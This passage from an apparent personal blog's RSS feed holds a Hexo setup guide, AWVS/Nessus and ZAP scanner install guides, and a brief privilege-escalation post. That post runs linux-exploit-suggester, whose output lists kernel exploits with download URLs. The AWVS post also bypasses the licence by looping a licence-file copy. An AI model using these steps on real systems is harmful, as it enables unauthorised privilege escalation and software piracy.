img元素自己的width)÷2*/&#125;&lt;/style&gt;</code></pre><h1 id="2-建立-about等页面"><a href="#2-建立-about等页面" class="headerlink" title="2  建立 about等页面"></a>2  建立 about等页面</h1><h1 id="3-使用标签和分类"><a href="#3-使用标签和分类" class="headerlink" title="3 使用标签和分类"></a>3 使用标签和分类</h1><p> <strong>注：文章标签可以添加多个，分类却只能有一个，设置多个只有第一个生效。</strong> </p><h2 id="3-1-标签"><a href="#3-1-标签" class="headerlink" title="3.1 标签"></a>3.1 标签</h2><p>在Hexo博客本地根目录右键选择<code>Git Bash</code>（前提是已安装好<code>Git</code>和<code>Node.js</code>,可参照<a href="https://sogrey.github.io/article/%E5%A6%82%E4%BD%95%E5%9C%A8Github-Pages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E4%B8%BB%E9%A1%B5%EF%BC%9F/">如何在Github Pages搭建个人独立主页？</a>）,输入命令：</p><pre><code>hexo new page tags</code></pre><p>回车，提示：</p><pre><code>INFO  Created: ...\source\tags\index.md</code></pre><p>就创建完成了。在<code>source\</code>目录下会多出一个<code>tags</code>文件夹，里面有一个<code>index.md</code>文件，打开该文件输入如下：</p><pre><code>---title: 标签云date: 2017-01-10 22:54:00type: &quot;tags&quot;comments: true---</code></pre><p>其中：<code>title</code>和<code>date</code>是标题和创建时间，<code>type</code>表示类型，值<code>tags</code>表示这是个标签云页面，<code>comments</code>是是否允许评论，<code>true</code>表示允许评论。</p><p>这样标签云页面已经创建好了，部署试一下：</p><h2 id="3-2-分类"><a href="#3-2-分类" class="headerlink" title="3.2 分类"></a>3.2 分类</h2><h3 id="3-2-1-站点配置"><a href="#3-2-1-站点配置" class="headerlink" title="3.2.1 站点配置"></a>3.2.1 站点配置</h3><p>在站点根目录下的<code>_config.yml</code>里有这么一段：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Directory</span>source_dir: <span class="token function">source</span>public_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :langskip_render:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中：<code>category_dir: categories</code>就是分配分类目录了，没有的可以按这样配置，下面就是创建了。</p><h3 id="3-2-2-创建分类"><a href="#3-2-2-创建分类" class="headerlink" title="3.2.2 创建分类"></a>3.2.2 创建分类</h3><p>跟创建<code>云标签</code>一样：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new page categories<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在<code>source</code>目录下生成一个<code>categories\index.md</code>文件，编辑它：</p><pre class="line-numbers language-bash"><code class="language-bash">---date: 2017-01-12 02:23:17title: categoriestype: <span class="token string">"categories"</span>comments: <span class="token boolean">false</span>---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上一篇说道<code>type</code>值为<code>tags</code>是标签云，这里是分类<code>categories</code>。就这么简单不用再做其他输入。</p><p><img src="/2020/08/26/hexo-guide/1599186880480.png" alt="1599186880480"></p><h1 id="4-评论系统搭建"><a href="#4-评论系统搭建" class="headerlink" title="4 评论系统搭建"></a>4 评论系统搭建</h1><p>我用的主题版本是3.5的。主题目前支持Disqus，多说[倒闭了]及友言[倒闭了]评论，还有valine,wildfire,gitalk。其中Disqus是国外的第三方评论插件，如果没有翻墙的话，是无法显示的。并且在使用该第三方评论插件的时候，需要先注册才能用。网上发现大家都在用gitalk，因此我也打算入手一波。步骤如下：</p><p><strong>（1）申请ClientID和ClientSecrets</strong></p><p>注册一个 Github OAuth application: <a href="https://github.com/settings/applications/new">https://github.com/settings/applications/new</a></p><p>记下 <code>clientID</code> 和 <code>clientSecret</code></p><p><img src="/2020/08/26/hexo-guide/1613701655740.png" alt="1613701655740"></p><p><img src="/2020/08/26/hexo-guide/1613645427696.png" alt="1613645427696"></p><p><strong>（2）在主题配置文件 _config.yml 中添加</strong></p><p>将on改为true，然后写上第一步申请到的clinetID和 clientSecret，repo可以直接填写博客对应的仓库没，除此之外，还有其他很多参数，有兴趣的话可以 <a href="https://github.com/gitalk/gitalk#options">点这里</a>。 </p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">gitalk</span><span class="token punctuation">:</span>  <span class="token key atrule">on</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">clientID</span><span class="token punctuation">:</span> <span class="token string">'xxxxxx'</span>  <span class="token key atrule">clientSecret</span><span class="token punctuation">:</span> <span class="token string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>  <span class="token key atrule">repo</span><span class="token punctuation">:</span> 'm01ly.github.io'//存储你评论 issue 的 Github 仓库名（建议直接用 GitHub Page 的仓库名）  <span class="token key atrule">owner</span><span class="token punctuation">:</span> <span class="token string">'m01ly'</span>  <span class="token key atrule">admin</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'m01ly'</span><span class="token punctuation">]</span>//这个仓库的管理员，可以有多个，用数组表示，一般写自己<span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后部署上线，就会看到未找到相关的Issues进行评论，并且有个404错误，这里忘记截图啦，然后网上看了原因，什么字段太长啥的都不是，后面看F12，查看404错误的原因，点击链接进入下图，然后点击access后，再刷新页面，登录github账号，就可以啦。</p><p><img src="/2020/08/26/hexo-guide/1613714256885.png" alt="1613714256885"></p><p>但是有个小问题，Gitalk 需要你点开每篇文章的页面才会创建对应的 issue,文章多的人，可以参考<a href="https://draveness.me/git-comments-initialize">这篇 自动初始化Gitalk和Gitment评论</a>就解决了这个问题。</p><p><img src="/2020/08/26/hexo-guide/1613714581563.png" alt="1613714581563"></p><p>参考：</p><p><a href="http://github.shadowwu.club/2017/12/19/Gittalk%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%8F%8A%E6%B5%8B%E8%AF%95/">为博客添加 Gitalk 评论插件</a></p><p><a href="https://draveness.me/git-comments-initialize">自动初始化Gitalk和Gitment评论</a></p><h1 id="5-基本命令使用"><a href="#5-基本命令使用" class="headerlink" title="5 基本命令使用"></a>5 基本命令使用</h1><p>在根目录下blog/Hexo下右击，点击“git bash here”，然后进行文章的发布管理等。</p><p><img src="/2020/08/26/hexo-guide/1613635158320.png" alt="1613635158320"></p><p>hexo部分常用命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">$ hexo n <span class="token string">"博客名称"</span>  <span class="token operator">=</span><span class="token operator">></span> hexo new <span class="token string">"博客名称"</span>   <span class="token comment" spellcheck="true">#这两个都是创建新文章，前者是简写模式</span>$ hexo clean <span class="token comment" spellcheck="true">#清空本地导出的博客</span>$ hexo g  <span class="token operator">=</span><span class="token operator">></span> hexo generate  <span class="token comment" spellcheck="true">#生成</span>$ hexo s  <span class="token operator">=</span><span class="token operator">></span> hexo server  <span class="token comment" spellcheck="true">#本地服务器浏览</span>$ hexo d  <span class="token operator">=</span><span class="token operator">></span> hexo deploy  <span class="token comment" spellcheck="true">#部署</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">$ hexo server   <span class="token comment" spellcheck="true">#Hexo 会监视文件变动并自动更新，无须重启服务器。</span>$ hexo server -s   <span class="token comment" spellcheck="true">#静态模式</span>$ hexo server -p 5000   <span class="token comment" spellcheck="true">#更改端口</span>$ hexo server -i 192.168.1.1   <span class="token comment" spellcheck="true">#自定义IP</span>$ hexo clean   <span class="token comment" spellcheck="true">#清除缓存，网页正常情况下可以忽略此条命令</span>$ hexo g   <span class="token comment" spellcheck="true">#生成静态网页</span>$ hexo d   <span class="token comment" spellcheck="true">#开始部署</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-注意事项"><a href="#6-注意事项" class="headerlink" title="6 注意事项"></a>6 注意事项</h1><p>md文件命名最好英文</p><p>用yelee主题的博客：</p><p><a href="https://www.gokuweb.com/web/39c1ec60.html">https://www.gokuweb.com/web/39c1ec60.html</a> </p><p><a href="https://sogrey.top/article/">https://sogrey.top/article/</a> </p><p>  [<a href="https://durant35.github.io/2016/09/16/hexo_Theme%20Yelee%20Migrant%20Note/#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%89%88%E6%9D%83%E4%BF%A1%E6%81%AF]">https://durant35.github.io/2016/09/16/hexo_Theme%20Yelee%20Migrant%20Note/#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%89%88%E6%9D%83%E4%BF%A1%E6%81%AF]</a>(<a href="https://durant35.github.io/2016/09/16/hexo_Theme">https://durant35.github.io/2016/09/16/hexo_Theme</a> Yelee Migrant Note/#自定义版权信息)   好的文章推荐–待安装</p><p> <a href="https://os_heartstill.gitee.io/chih-ping/2019/05/10/Hexo%E7%9A%84Yelee%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">https://os_heartstill.gitee.io/chih-ping/2019/05/10/Hexo%E7%9A%84Yelee%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</a> </p><h1 id="7-常见报错"><a href="#7-常见报错" class="headerlink" title="7 常见报错"></a>7 常见报错</h1><p><strong>hexo s报错如下：</strong></p><pre class="line-numbers language-bash"><code class="language-bash">$ hexo gINFO  Validating configINFO  Start processingFATAL <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>  err: TypeError <span class="token punctuation">[</span>ERR_INVALID_URL<span class="token punctuation">]</span>: Invalid URL: http://www.linuxidc.com<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#</span>      at onParseError <span class="token punctuation">(</span>internal/url.js:256:9<span class="token punctuation">)</span>      at new URL <span class="token punctuation">(</span>internal/url.js:332:5<span class="token punctuation">)</span>      at encodeURL <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\hexo-util\lib\encode_url.js:8:20<span class="token punctuation">)</span>      at Renderer.link <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\hexo-renderer-marked\lib\renderer.js:56:27<span class="token punctuation">)</span>      at Parser.parseInline <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\marked\src\Parser.js:211:27<span class="token punctuation">)</span>      at Parser.parse <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\marked\src\Parser.js:162:47<span class="token punctuation">)</span>      at Function.parse <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\marked\src\Parser.js:27:19<span class="token punctuation">)</span>      at marked <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\marked\src\marked.js:110:19<span class="token punctuation">)</span>      at Hexo.module.exports <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\hexo-renderer-marked\lib\renderer.js:138:10<span class="token punctuation">)</span>      at Hexo.tryCatcher <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\util.js:16:23<span class="token punctuation">)</span>      at Hexo.<span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\method.js:15:34<span class="token punctuation">)</span>      at C:\blog\Hexo\node_modules\hexo\lib\hexo\render.js:75:22      at tryCatcher <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\util.js:16:23<span class="token punctuation">)</span>      at Promise._settlePromiseFromHandler <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\promise.js:547:31<span class="token punctuation">)</span>      at Promise._settlePromise <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\promise.js:604:18<span class="token punctuation">)</span>      at Promise._settlePromiseCtx <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\promise.js:641:10<span class="token punctuation">)</span>      at _drainQueueStep <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\async.js:97:12<span class="token punctuation">)</span>      at _drainQueue <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\async.js:86:9<span class="token punctuation">)</span>      at Async._drainQueues <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\async.js:102:5<span class="token punctuation">)</span>      at Immediate.Async.drainQueues <span class="token punctuation">[</span>as _onImmediate<span class="token punctuation">]</span> <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\async.js:15:14<span class="token punctuation">)</span>      at processImmediate <span class="token punctuation">(</span>internal/timers.js:456:21<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    input: <span class="token string">'http://www.linuxidc.com]#'</span>,    code: <span class="token string">'ERR_INVALID_URL'</span>  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; Something's wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/08/26/hexo-guide/1613635511527.png" alt="1613635511527"></p><p><strong>solution：</strong></p><p>后面发现是因为代码格式的代码有问题，所以造成报错。</p>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2020/08/26/hexo-guide/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>AWVS和Nessus镜像安装</title>
      <link>https://m01ly.github.io/2020/08/26/scan-awvs-nessus/</link>
      <guid>https://m01ly.github.io/2020/08/26/scan-awvs-nessus/</guid>
      <pubDate>Wed, 26 Aug 2020 09:33:07 GMT</pubDate>
      
      <description>&lt;p&gt;文章来自：&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&amp;mid=2247498179&amp;idx=2&amp;sn=fa6f117c420bc52306508fe81af3b4d3&amp;chksm=ec26d85bdb51514d6def0629e0c71ed5506b1939a9f69b30ff47d977fab8cc96dc15af16fb1c&amp;mpshare=1&amp;scene=23&amp;srcid=1031d22NMZJcOV53f1sF2DPA&amp;sharer_sharetime=1604139889173&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd&quot;&gt;漏洞扫描—Awvs&amp;amp;Nessus(Docker版V3.0)–雷石安全&lt;/a&gt;,雷石实验室维护的AWVS和Nessus镜像，可以去&lt;a href=&quot;https://hub.docker.com/r/leishianquan/awvs-nessus/tags?page=1&amp;ordering=last_updated&quot;&gt;docker hub&lt;/a&gt;上查看最新版本&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>文章来自：<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&mid=2247498179&idx=2&sn=fa6f117c420bc52306508fe81af3b4d3&chksm=ec26d85bdb51514d6def0629e0c71ed5506b1939a9f69b30ff47d977fab8cc96dc15af16fb1c&mpshare=1&scene=23&srcid=1031d22NMZJcOV53f1sF2DPA&sharer_sharetime=1604139889173&sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd">漏洞扫描—Awvs&amp;Nessus(Docker版V3.0)–雷石安全</a>,雷石实验室维护的AWVS和Nessus镜像，可以去<a href="https://hub.docker.com/r/leishianquan/awvs-nessus/tags?page=1&ordering=last_updated">docker hub</a>上查看最新版本</p><a id="more"></a><h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h1><p>pull 拉取下载镜像</p><pre class="line-numbers language-bash"><code class="language-bash">docker pull leishianquan/awvs-nessus:v4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -d -p 13443:3443 -p 8834:8834 leishianquan/awvs-nessus:v4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要注意的是访问Nessus需要进入容器启动Nessus 服务：</p><p>查看容器</p><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">ps</span> -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动容器</p><pre class="line-numbers language-bash"><code class="language-bash">docker start 容器id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入容器</p><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">exec</span> -it 容器id <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装nessus时区</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> tzdata:Asia/Shanghai<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动nessus服务</p><pre class="line-numbers language-bash"><code class="language-bash">/etc/init.d/nessusd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/08/26/scan-awvs-nessus/1616051151150.png" alt="1616051151150"></p><p>破解awvs：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /home/license_info.json /home/acunetix/.acunetix/data/license/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="2-使用"><a href="#2-使用" class="headerlink" title="2 使用"></a>2 使用</h1><p><strong>Nessus:</strong></p><p><a href="https://127.0.0.1:8834/#/">https://127.0.0.1:8834/#/</a></p><p>nessus username:leishi</p><p>nessus password:leishianquan</p><p><strong>Awvs</strong>：</p><p><a href="https://127.0.0.1:13443/">https://127.0.0.1:13443/</a></p><p>awvs13 username: <a href="mailto:&#x6c;&#101;&#x69;&#115;&#104;&#105;&#x40;&#x6c;&#101;&#105;&#115;&#x68;&#x69;&#x2e;&#99;&#x6f;&#109;">&#x6c;&#101;&#x69;&#115;&#104;&#105;&#x40;&#x6c;&#101;&#105;&#115;&#x68;&#x69;&#x2e;&#99;&#x6f;&#109;</a></p><p>awvs13 password: Leishi123</p><h1 id="3-注意事项"><a href="#3-注意事项" class="headerlink" title="3 注意事项"></a>3 注意事项</h1><p>这里需要注意，这个docker镜像有点小bug:AWVS证书用了一会后容易失效，出现如下图所示。这里我采取的笨方法是一直cp证书，代码如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">" while true ;do cp /home/license_info.json /home/acunetix/.acunetix/data/license/; sleep 1; done; "</span> <span class="token operator">></span> t.sh<span class="token function">chmod</span> 777 t.sh<span class="token function">nohup</span> ./t.sh <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2020/08/26/scan-awvs-nessus/1604372586478.png" alt="1604372586478"></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/">漏洞扫描</category>
      
      
      <comments>https://m01ly.github.io/2020/08/26/scan-awvs-nessus/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ZAP的安装和使用</title>
      <link>https://m01ly.github.io/2020/08/26/scan-zap/</link>
      <guid>https://m01ly.github.io/2020/08/26/scan-zap/</guid>
      <pubDate>Wed, 26 Aug 2020 09:33:07 GMT</pubDate>
      
      <description>&lt;p&gt;官网&lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;https://www.zaproxy.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;较好的教程：&lt;a href=&quot;https://www.wangan.com/docs/802&quot;&gt;https://www.wangan.com/docs/802&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;官网可以下载软件，也可安装docker版本的&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>官网<a href="https://www.zaproxy.org/">https://www.zaproxy.org/</a></p><p>较好的教程：<a href="https://www.wangan.com/docs/802">https://www.wangan.com/docs/802</a></p><p>官网可以下载软件，也可安装docker版本的</p><a id="more"></a><h1 id="0-前提"><a href="#0-前提" class="headerlink" title="0 前提"></a>0 前提</h1><p>需要java8的环境，查看java版本命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$java</span> -version<span class="token variable">$which</span> java<span class="token variable">$whereis</span> java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果装了java 7,8 ，当前java 为java7，只需要切换版本即可，即重新设置环境变量</p><p>(2)修改环境变量</p><p>$vi /etc/profile </p><p>设置如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> JAVA_HOME<span class="token operator">=</span>/opt/jdk1.8.0_60<span class="token function">export</span> CLASSPATH<span class="token operator">=</span>.:<span class="token variable">$JAVA_HOME</span>/lib/dt.jar:<span class="token variable">$JAVA_HOME</span>/lib/tools.jar<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token variable">$PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(3)环境变量生效</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="1-docker安装ZAP"><a href="#1-docker安装ZAP" class="headerlink" title="1  docker安装ZAP"></a>1  docker安装ZAP</h1><p>进入官网<a href="https://www.zaproxy.org/download/">下载页面</a>，往下拉可以看到docker下载地址，这里我们选择stable，稳定版本，然后按照官网的<a href="https://www.zaproxy.org/docs/docker/about/">guide</a>逐步按照即可。</p><p><img src="/2020/08/26/scan-zap/1604399364254.png" alt="1604399364254"></p><p>(1) 拉取镜像</p><pre class="line-numbers language-bash"><code class="language-bash">docker pull owasp/zap2docker-stable:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/08/26/scan-zap/1604399706466.png" alt="1604399706466"></p><p>（2）启动</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -u zap -p 8080:8080 -p 8090:8090 -i owasp/zap2docker-stable zap-webswing.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意一定是<a href="http://10.27.22.92:8080/zap/%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%98%AFhttp://10.27.22.92:8080%E4%BC%9A%E5%87%BA%E7%8E%B0%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E3%80%82%E5%BC%80%E5%A7%8B%E5%87%BA%E7%8E%B0%E6%98%AF%E5%B0%8F%E5%B1%8F%E5%B9%95%EF%BC%8C%E7%82%B9%E5%87%BB%E5%85%A8%E5%B1%8F%E5%8D%B3%E5%8F%AF%E3%80%82">http://10.27.22.92:8080/zap/，如果是http://10.27.22.92:8080会出现输入用户名密码。开始出现是小屏幕，点击全屏即可。</a></p><p><img src="/2020/08/26/scan-zap/1604409202576.png" alt="1604409202576"></p><h1 id="2-直接安装"><a href="#2-直接安装" class="headerlink" title="2 直接安装"></a>2 直接安装</h1><p>适用于可以有界面的终端</p><pre><code>[root@m01ly ~]# wget https://github.com/zaproxy/zaproxy/releases/download/v2.9.0/ZAP_2_9_0_unix.sh</code></pre><p><img src="/2020/08/26/scan-zap/1604405494656.png" alt="1604405494656"></p><p>（2）安装</p><pre><code>[root@m01ly ~]# chmod 777 ZAP_2_9_0_unix.sh[root@m01ly ~]# ./ZAP_2_9_0_unix.sh</code></pre><p>弹出界面：</p><p><img src="/2020/08/26/scan-zap/1604405604464.png" alt="1604405604464"></p><p><img src="/2020/08/26/scan-zap/1604405660783.png" alt="1604405660783"></p><p>默认安装路径位于/usr/local/zaproxy中，同时在用户目录下存在一个文件，位置为/home/admin/.ZAP，里面存放了软件的配置文件(config.xml)、脚本文件（community-scripts)、插件文件（plugin）、策略配置文件（policies）、远程调用会话保存目录（session）、本地启动文件会话（sessions）等重要文件；<strong>注意每次软件关闭时候，就会保存配置</strong>，所以配置文件的内容是最后一次软件关闭前的配置 </p><p><img src="/2020/08/26/scan-zap/1604405876783.png" alt="1604405876783"></p><p>执行zap.sh</p><pre><code>[root@m01ly zaproxy]# ./zap.sh</code></pre><p>在虚拟机之外弹出了ZAP，说实话第一次安装有点吓一跳。</p><p><img src="/2020/08/26/scan-zap/1604406130388.png" alt="1604406130388"></p><p>这里注意如果是堡垒机去安装，则不适合这种安装方式，会出现如图所示的错误，最好选择docker版本的。</p><p><img src="/2020/08/26/scan-zap/1604407388145.png" alt="1604407388145"></p><pre><code>./zap.sh -daemon</code></pre><p>虽然启动成功， 但却无法在linux上启动后直接打开zap程序 </p><h1 id="3-特性"><a href="#3-特性" class="headerlink" title="3 特性"></a>3 特性</h1><p>缺点：报告格式仅仅支持html,xml不支持csv,excel。</p><p>优点：集扫描，拦截（bp的功能），使用于个人渗透测试。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/528e6ffd6d29">ZAP使用教程</a></p><p><a href="https://www.cnblogs.com/haohao111/p/11769727.html">安装教程</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/">漏洞扫描</category>
      
      
      <comments>https://m01ly.github.io/2020/08/26/scan-zap/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>提权</title>
      <link>https://m01ly.github.io/2020/08/26/pt-tiquan/</link>
      <guid>https://m01ly.github.io/2020/08/26/pt-tiquan/</guid>
      <pubDate>Wed, 26 Aug 2020 08:34:27 GMT</pubDate>
      
      <description>&lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;待完善&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id><a href="#" class="headerlink" title></a></h2><p>待完善</p><a id="more"></a><pre><code>wget https://github.com/mzet-/linux-exploit-suggesterchmod 777 les.sh./les.sh</code></pre><p><img src="/2020/08/26/pt-tiquan/1604483327437.png" alt="1604483327437"></p><pre><code>Available information:Kernel version: 3.10.0Architecture: x86_64Distribution: RHELDistribution version: 18.04Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performedPackage listing: N/ASearching among:74 kernel space exploits0 user space exploitsPossible Exploits:[+] [CVE-2016-5195] dirtycow   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails   Exposure: probable   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,ubuntu=16.04|14.04|12.04   Download URL: https://www.exploit-db.com/download/40611   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh[+] [CVE-2016-5195] dirtycow 2   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails   Exposure: probable   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;   Download URL: https://www.exploit-db.com/download/40839   ext-url: https://www.exploit-db.com/download/40847   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh[+] [CVE-2019-15666] XFRM_UAF   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc   Exposure: less probable   Download URL:    Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled[+] [CVE-2017-7308] af_packet   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html   Exposure: less probable   Tags: ubuntu=16.04&#123;kernel:4.8.0-(34|36|39|41|42|44|45)-generic&#125;   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at &#39;ext-url&#39; adds support for additional kernels[+] [CVE-2017-6074] dccp   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3   Exposure: less probable   Tags: ubuntu=(14.04|16.04)&#123;kernel:4.4.0-62-generic&#125;   Download URL: https://www.exploit-db.com/download/41458   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass[+] [CVE-2017-1000253] PIE_stack_corruption   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt   Exposure: less probable   Tags: RHEL=6,RHEL=7&#123;kernel:3.10.0-514.21.2|3.10.0-514.26.1&#125;   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c[+] [CVE-2016-2384] usb-midi   Details: https://xairy.github.io/blog/2016/cve-2016-2384   Exposure: less probable   Tags: ubuntu=14.04,fedora=22   Download URL: 